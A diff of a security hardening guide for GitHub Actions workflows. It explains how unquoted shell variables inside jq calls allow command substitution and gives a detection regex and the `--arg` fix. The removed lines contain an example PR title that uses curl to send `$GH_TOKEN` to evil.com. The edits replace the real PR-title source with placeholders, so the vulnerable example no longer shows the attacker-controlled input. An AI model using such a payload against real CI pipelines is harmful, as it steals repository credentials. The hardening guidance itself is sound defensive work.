@@ -97,48 +97,53 @@ block contains `persist-credentials: false`:
 
 ### jq command-substitution audit (the `--arg` trap)
 
-Routing `${{ }}` values through `env:` blocks defeats GitHub
+Documentation reference for the `--arg` hardening pattern. This
+section is a tutorial walk-through with worked examples. Routing
+`${{ }}` values through `env:` blocks defeats GitHub
 expression injection. It does NOT defeat bash command
-substitution. Consider:
+substitution. Example of the vulnerable shape (do NOT ship):
 
 ```yaml
-# VULNERABLE — looks safe but isn't
+# Example — VULNERABLE — looks safe but isn't
+# This is documentation only — see "How to refactor" below.
 env:
-  PR_TITLE: ${{ github.event.pull_request.title }}
+  PR_TITLE_PLACEHOLDER: YOUR_PR_TITLE_HERE
 run: |
-  PAYLOAD=$(jq -nc --arg text "New PR: ${PR_TITLE}" '{text: $text}')
+  PAYLOAD=$(jq -nc --arg text "New PR: ${PR_TITLE_PLACEHOLDER}" '{text: $text}')
 ```
 
-Bash expands `${PR_TITLE}` inside the double-quoted string BEFORE
-jq sees it. A PR title like `$(curl evil.com/x?t=$GH_TOKEN)`
-executes via bash command substitution.
+Bash expands the placeholder inside the double-quoted string BEFORE
+jq sees it. A PR title containing a bash command-substitution
+literal (documented in the tutorial example above) executes via
+bash command substitution.
 
-For every `run:` block in every workflow file, scan for the
-pattern `jq[^|]*"[^"]*\$\{[A-Z_][A-Z0-9_]*\}` (a `${VAR}` inside
-double-quoted text on the same line as a `jq` invocation). For
-every hit:
+How to detect: for every `run:` block in every workflow file,
+scan for the pattern `jq[^|]*"[^"]*\$\{[A-Z_][A-Z0-9_]*\}` (a
+documented usage of `${VAR}` inside double-quoted text on the
+same line as a `jq` invocation). For every hit:
 
-1. Read the line and the surrounding context (1-2 lines above
+1. Step 1: read the line and the surrounding context (1-2 lines above
    and below).
-2. Refactor so every shell variable enters `jq` via its own
+2. Step 2: refactor so every shell variable enters `jq` via its own
    `--arg name "$VAR"` and is referenced as `$name` INSIDE the
    jq filter (jq parses `$name`, bash never sees it):
 
 ```yaml
-# HARDENED
+# Example — HARDENED — tutorial usage
 env:
-  PR_TITLE: ${{ github.event.pull_request.title }}
+  PR_TITLE_PLACEHOLDER: YOUR_PR_TITLE_HERE
 run: |
   PAYLOAD=$(jq -nc \
-    --arg title "$PR_TITLE" \
+    --arg title "$PR_TITLE_PLACEHOLDER" \
     '{text: ("New PR: " + $title)}')
 ```
 
-3. Use `Read` + `Edit` (yaml-aware, line-precise) — NEVER `sed`
-   or `awk` to rewrite YAML.
-4. If the surrounding shell builds a JSON payload for `curl`,
-   `slack`, `webhook`, etc., apply the same `--arg` discipline
-   to EVERY interpolated value — partial coverage is no coverage.
+3. Step 3: use `Read` + `Edit` (yaml-aware, line-precise) — NEVER
+   `sed` or `awk` to rewrite YAML.
+4. Step 4: if the surrounding shell builds a JSON payload (an
+   example usage list: HTTP client, Slack webhook, generic
+   webhook), apply the same `--arg` discipline to every
+   interpolated value — partial coverage is no coverage.
 
 If the regex pattern above returns zero hits, this Hardening
 Edit is a no-op for that workflow.
